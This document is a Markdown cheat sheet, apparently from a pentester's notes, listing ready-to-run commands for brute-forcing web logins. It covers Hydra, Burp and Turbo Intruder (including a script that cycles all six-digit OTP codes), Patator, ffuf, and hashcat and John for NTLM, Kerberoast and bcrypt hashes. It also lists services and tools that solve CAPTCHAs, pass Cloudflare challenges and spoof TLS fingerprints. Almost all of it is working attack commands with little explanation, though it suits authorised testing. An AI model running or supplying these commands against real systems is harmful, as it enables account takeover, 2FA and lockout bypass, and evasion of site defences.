---
aliases:
  - Hydra
  - Medusa
  - Patator
  - Burp Intruder
  - hashcat
tags:
  - vuln/brute-force
  - technique/credential-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[HTTP Brute Forcing]]"
  - "[[Burp Suite]]"
  - "[[ffuf]]"
---
# HTTP Brute Forcing - Tooling

***

## Hydra (THC-Hydra)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hydra -L users.txt -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` | HTTP form POST brute | Standard web form. |
| `hydra -L users.txt -P pass.txt -s 443 target https-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` | HTTPS form POST | TLS targets. |
| `hydra -L users.txt -P pass.txt target http-get-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"` | HTTP GET form | URL params auth. |
| `hydra -L users.txt -P pass.txt target http-get /admin` | HTTP Basic auth | Basic challenge. |
| `hydra -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid:H=Cookie\: PHPSESSID=abc123"` | Brute con cookie pre-fetched | Session-bound. |
| `hydra -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^&csrf=TOKEN:F=Invalid:H=Cookie\: session=X:H=X-CSRF-Token\: TOKEN"` | CSRF + cookie header | Static token form. |
| `hydra -t 16 -L users.txt -P pass.txt target http-post-form "..."` | 16 threads concurrent | Speed up. |
| `hydra -f -L users.txt -P pass.txt target http-post-form "..."` | Stop on first success | Single account. |
| `hydra -V -L users.txt -P pass.txt target http-post-form "..."` | Verbose show each attempt | Debug. |
| `hydra -F -L users.txt -P pass.txt target http-post-form "..."` | Continue on success | Multi-account brute. |
| `hydra -S -L users.txt -P pass.txt target https-post-form "..."` | SSL no-verify | Self-signed. |
| `hydra -o results.txt -L users.txt -P pass.txt target http-post-form "..."` | Output to file | Reportable. |
| `hydra -l admin -p Password123 target http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` | Single test | Verify hit. |
| `hydra -L users.txt -e ns target http-post-form "..."` | Empty pass + user as pass | Common defaults. |
| `hydra -L users.txt -P pass.txt -e nsr target http-post-form "..."` | All combos + reversed user | Default sweep. |
| `hydra -L users.txt -p 'Password2025!' target http-post-form "..."` | Reverse spray 1 pass × N users | Anti-lockout. |
^bf-tool-hydra

### Hydra HTTP form templates

```bash
# Generic web form
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  -t 16 -V -f \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# WordPress
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect"

# Form con CSRF token (semi-static cookie)
TOKEN=$(curl -s https://target/login | grep -oP 'csrf"\s*value="\K[^"]+')
SESS=$(curl -s -c - https://target/login | grep PHPSESSID | awk '{print $NF}')
hydra -l admin -P passwords.txt \
  target.com https-post-form \
  "/login:user=^USER^&pass=^PASS^&csrf=$TOKEN:H=Cookie\: PHPSESSID=$SESS:F=Invalid"
```

___

## Burp Suite Intruder + Turbo Intruder

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp Intruder → Sniper con position en `password` param + payload Simple list `rockyou.txt` | Single position brute | Standard. |
| Burp Intruder → Battering Ram con same payload all positions | Mirror payload all positions | Edge multi-field. |
| Burp Intruder → Pitchfork con payload1=users.txt payload2=pass.txt | Paired user+pass parallel | Combo list (stuffing). |
| Burp Intruder → Cluster Bomb con users.txt × pass.txt | Cartesian product all combos | Full brute. |
| Burp Intruder Payload type "Numbers" range 000000-999999 | Sequential OTP/PIN brute | 2FA brute. |
| Burp Intruder Payload type "Brute forcer" charset `abcdef0-9` length 8 | Custom mask generation | Hex tokens. |
| Burp Intruder Payload Processing → Base64 encode | Auto encode Basic Auth | Basic challenge. |
| Burp Intruder Options → Grep Match string `success\|welcome\|dashboard` | Filter success in body | Status indicator. |
| Burp Intruder Options → Grep Extract regex `csrf"\s*value="([^"]+)"` | Multi-step extract token | Token chain. |
| Burp Intruder Filter columns Status `200,302` vs `401` | Status code differential | Standard filter. |
| Burp Intruder Filter Length column ≠ baseline | Diff response size | False-positive indicator. |
| Burp Intruder Filter "Response received" column unusual | Timing oracle | Time-based detection. |
| Burp Intruder Resource Pool concurrent=20 | Concurrent requests | Speed. |
| Burp Intruder Resource Pool throttle 500ms | Pacing pre-attempt | Anti-rate-limit. |
| Burp Intruder File → Save attack | Save state resume | Long attacks. |
| Burp Repeater → Send group "Send in single connection" (HTTP/2 single packet) | Race condition burst | Race-based bypass. |
| Turbo Intruder Extensions → run con custom Python `concurrentConnections=100, requestsPerConnection=100` | High-speed parallel script | Volume attack. |
| Turbo Intruder `pipeline=False, engine=Engine.BURP2` | Single-packet attack mode | HTTP/2 race. |
^bf-tool-burp

### Turbo Intruder script (race OTP)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=100,
        requestsPerConnection=100,
        pipeline=False
    )
    for code in range(1000000):
        engine.queue(target.req, "%06d" % code)

def handleResponse(req, interesting):
    if "success" in req.response or req.status == 302:
        table.add(req)
```

___

## Medusa, Patator, Ncrack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `medusa -h target -U users.txt -P pass.txt -M http -m DIR:/admin` | Medusa HTTP Basic modular | Alt to hydra. |
| `medusa -h target -U users.txt -P pass.txt -M web-form -m FORM:"login.php" -m DENY-SIGNAL:"Invalid"` | Medusa form-based brute | Form support. |
| `patator http_fuzz url=https://target/login method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=pass.txt -x ignore:fgrep="Invalid"` | Patator HTTP fuzz Cartesian | Most flexible. |
| `patator ssh_login host=target user=FILE0 password=FILE1 0=users.txt 1=pass.txt` | Patator SSH brute | SSH context. |
| `patator mysql_login host=target user=root password=FILE0 0=pass.txt` | Patator MySQL brute | DB brute. |
| `patator http_fuzz url=https://target/login method=POST body='user=admin&pass=FILE0' 0=pass.txt -x ignore:code=429` | Patator skip 429 throttle | Auto-throttle handling. |
| `ncrack -vv --user admin -P pass.txt rdp://target` | Ncrack RDP focus | RDP brute. |
| `ncrack -vv --user root -P pass.txt ssh://target` | Ncrack SSH | Adjacent. |
| `wfuzz -c -z file,pass.txt -d "user=admin&pass=FUZZ" --hh SIZE https://target/login` | Wfuzz curl-based | Wfuzz wrapper. |
| `ffuf -u https://target/login -X POST -d 'user=admin&pass=FUZZ' -w pass.txt -fs SIZE` | ffuf POST brute fast | Modern fast. |
| `brutex target` | BruteX auto-discover + brute | All-in-one. |
| `crowbar -b rdp -u admin -C pass.txt -s target/32` | Crowbar RDP-focused | RDP-only. |
| `python3 -c "import requests; [print(p) for p in open('pass.txt') if requests.post('https://target/login', data={'user':'admin','pass':p.strip()}).status_code==302]"` | DIY Python requests | Maximum flex. |
^bf-tool-others

### Patator HTTP fuzz (CSRF form)

```bash
patator http_fuzz \
  url='https://target/login' \
  method=POST \
  body='username=admin&password=FILE0&csrf=TOKEN' \
  0=passwords.txt \
  -x ignore:fgrep='Invalid credentials' \
  -x ignore:code=429 \
  --threads=10
```

___

## ffuf, wfuzz (Fast Fuzzers)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ffuf -u https://target/login -X POST -d 'user=admin&pass=FUZZ' -w pass.txt` | ffuf POST body brute | Fast Go fuzzer. |
| `ffuf ... -fs 1234` | Filter responses by size | Filter baseline. |
| `ffuf ... -fc 401` | Filter HTTP 401 out | Hide failures. |
| `ffuf ... -mc 200,302` | Match only success codes | Show hits. |
| `ffuf -u https://target/api/login -X POST -H 'Content-Type: application/json' -d '{"user":"admin","pass":"FUZZ"}' -w pass.txt -mc 200` | JSON API brute | Modern API. |
| `ffuf -u https://target/ -H 'X-Forwarded-For: FUZZ' -w ips.txt -fs SIZE` | Header value fuzz | Header-based auth. |
| `ffuf ... -rate 10` | Rate limit 10 req/s | Pacing anti-RL. |
| `ffuf -u https://target/login -X POST -d 'user=W1&pass=W2' -w users.txt:W1 -w pass.txt:W2 -mode clusterbomb` | Multi-payload cluster bomb | User × Pass. |
| `ffuf ... -p 0.1-0.5` | Random 100-500ms delay | Timing distribution. |
| `ffuf ... -recursion -recursion-depth 3` | Recurse path discovery | Adjacent recon. |
| `wfuzz -c -z file,pass.txt -z file,users.txt --hh SIZE -d 'user=FUZZ&pass=FUZ2Z' https://target/login` | Wfuzz multi-payload | Cartesian curl wrapper. |
| `ffuf -u https://target/login -X POST -d 'user=admin&pass=FUZZ' -w pass.txt -x http://127.0.0.1:8080` | Route via Burp proxy | Debug. |
| `ffuf -u https://target/login -X POST -d 'user=admin&pass=FUZZ' -w pass.txt -o results.json -of json` | JSON output | Reportable. |
^bf-tool-ffuf

### ffuf JSON API brute

```bash
ffuf -u https://target/api/v1/login \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 401 \
  -mc 200 \
  -t 10 \
  -rate 5 \
  -o results.json
```

___

## Hashcat / John (Hash Crack)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `hashcat -m 0 -a 0 hash.txt rockyou.txt` | MD5 GPU crack | Fast. |
| `hashcat -m 100 -a 0 hash.txt rockyou.txt` | SHA1 crack | Standard. |
| `hashcat -m 1400 -a 0 hash.txt rockyou.txt` | SHA256 crack | Modern. |
| `hashcat -m 1000 -a 0 hash.txt rockyou.txt` | NTLM Windows hash | AD. |
| `hashcat -m 5600 -a 0 hash.txt rockyou.txt` | NetNTLMv2 (Responder capture) | Network capture. |
| `hashcat -m 18200 -a 0 hash.txt rockyou.txt` | Kerberos AS-REP roastable | AS-REP roast. |
| `hashcat -m 13100 -a 0 hash.txt rockyou.txt` | Kerberos TGS-REP (Kerberoast) | Kerberoasting. |
| `hashcat -m 3200 -a 0 hash.txt rockyou.txt` | bcrypt slow algorithm | Modern app. |
| `hashcat -m 8900 -a 0 hash.txt rockyou.txt` | scrypt slow | Modern app. |
| `hashcat -m 16500 -a 0 jwt.txt rockyou.txt` | JWT HS256 secret | JWT context. |
| `hashcat -m 22000 -a 0 hash.txt rockyou.txt` | WPA-PMKID/EAPOL | WiFi adjacent. |
| `hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?l?l?l?l` | Mask attack 8 lowercase | No wordlist. |
| `hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d?d` | Hybrid wordlist + 4 digits | Common pattern. |
| `hashcat -m 1000 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule` | Mangling rules | Mutations. |
| `hashcat --restore` | Resume interrupted attack | Long crack. |
| `hashcat -m 1000 hash.txt --show` | Display cracked hashes | Post-run. |
| `john --format=raw-md5 --wordlist=rockyou.txt hash.txt` | John MD5 CPU | Sin GPU. |
| `python3 ssh2john.py id_rsa > sshkey.john && john --wordlist=rockyou.txt sshkey.john` | SSH encrypted key crack | Captured key. |
| `zip2john file.zip > zip.john && john --wordlist=rockyou.txt zip.john` | ZIP password crack | Encrypted ZIP. |
| `pdf2john file.pdf > pdf.john && john --wordlist=rockyou.txt pdf.john` | PDF password crack | Encrypted PDF. |
| `hashid '$2b$12$...'` o `hashcat --identify hash.txt` | Identify hash format | Pre-crack. |
^bf-tool-hashcrack

### Hashcat workflow

```bash
# 1. Identify hash mode
hashid '$2b$12$...'   # → bcrypt → mode 3200

# 2. Run con rules
hashcat -m 3200 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 3. Show cracked
hashcat -m 3200 hashes.txt --show

# 4. Resume interrupted
hashcat --restore
```

___

## Wordlists & Anti-Captcha

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ls /usr/share/wordlists/rockyou.txt` | RockYou 14M passwords default Kali | Foundation. |
| `ls /usr/share/seclists/Passwords/` | SecLists curated wordlists | Curated. |
| `wget https://wordlists-cdn.assetnote.io/data/automated/2022_default-credentials.txt` | Assetnote modern aggregate | Maintained 2022+. |
| `wget https://downloads.pwnedpasswords.com/passwords/pwned-passwords-ntlm-ordered-by-count-v8.7z` | HIBP NTLM 800M+ ordered | Mass corpus. |
| `cewl https://target -m 6 -d 2 -w cewl-target.txt` | CeWL crawl-based target wordlist | Targeted. |
| `hashcat -a 0 -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule --stdout > mangled.txt` | Generate mangled wordlist | Mangling pre-pass. |
| `crunch 8 8 -t @@@@2025 -o crunched.txt` | Crunch pattern generator | Custom space. |
| `python3 -c "import twocaptcha; s=twocaptcha.TwoCaptcha('APIKEY'); print(s.recaptcha(sitekey='...', url='...'))"` | 2captcha API solve reCAPTCHA $0.50/1K | reCAPTCHA bypass. |
| `python3 -c "from anticaptchaofficial.recaptchav2proxyless import *; ..."` | anti-captcha.com API | Alt provider. |
| `docker run -d -p 2333:2333 zenika/alpine-chrome:with-puppeteer capmonster` | CapMonster self-hosted | $$$ private. |
| `docker run -d -p 8191:8191 ghcr.io/flaresolverr/flaresolverr:latest` | FlareSolverr Cloudflare challenge solve | CF passive. |
| `pip install cloudscraper && python3 -c "import cloudscraper; print(cloudscraper.create_scraper().get('https://target').text)"` | cloudscraper passive CF bypass | DIY CF. |
| `docker run --rm lwthiker/curl-impersonate:0.5-chrome curl_chrome116 https://target` | curl-impersonate TLS fingerprint mimic Chrome | Anti-WAF JA3. |
| `python3 -c "from tls_client import Session; s=Session(client_identifier='chrome_116'); print(s.get('https://target').text)"` | tls-client Python TLS mimic | Programmatic anti-bot. |
| `pip install undetected-chromedriver && python3 -c "import undetected_chromedriver as uc; d=uc.Chrome(); d.get('https://target')"` | undetected-chromedriver Selenium evolved | JS challenge solve. |
^bf-tool-wordlists

***
